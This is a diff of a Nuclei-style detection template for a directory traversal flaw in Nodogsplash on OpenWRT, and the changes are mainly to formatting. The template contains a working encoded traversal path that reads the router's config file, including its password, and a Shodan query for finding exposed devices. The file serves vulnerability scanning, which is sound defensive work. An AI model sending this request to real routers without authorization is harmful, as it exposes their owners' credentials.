@@ -1,4 +1,5 @@
 id: nodogsplash-lfi
+
 info:
   name: Nodogsplash - Directory Traversal
   author: Numan Türle
@@ -18,14 +19,16 @@ info:
     cvss-score: 7.5
     cwe-id: CWE-22
   metadata:
+    verified: true
     max-request: 1
     shodan-query: title:"OpenWRT"
-    verified: true
-  tags: lfi,nodogsplash,openwrt,vuln
+  tags: lfi,openwrt,nodogsplash,vuln
+
 http:
   - method: GET
     path:
       - "{{BaseURL}}/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/config/nodogsplash"
+
     matchers-condition: and
     matchers:
       - type: word
@@ -34,11 +37,13 @@ http:
           - "nodogsplash"
           - "password"
         condition: and
+
       - type: word
         part: header
         words:
           - "application/octet-stream"
+
       - type: status
         status:
           - 200
-        # digest: 4b0a00483046022100f1a61ab4570a9de4ff848822418804b3a0a65907523899d231382e782f9e915d022100bca25f01e1db0443d40188a0a2df414db939fb21f595128a3726b1f37613dbda:922c64590222798bb761d5b6d8e72950
+# digest: 4b0a00483046022100f1a61ab4570a9de4ff848822418804b3a0a65907523899d231382e782f9e915d022100bca25f01e1db0443d40188a0a2df414db939fb21f595128a3726b1f37613dbda:922c64590222798bb761d5b6d8e72950
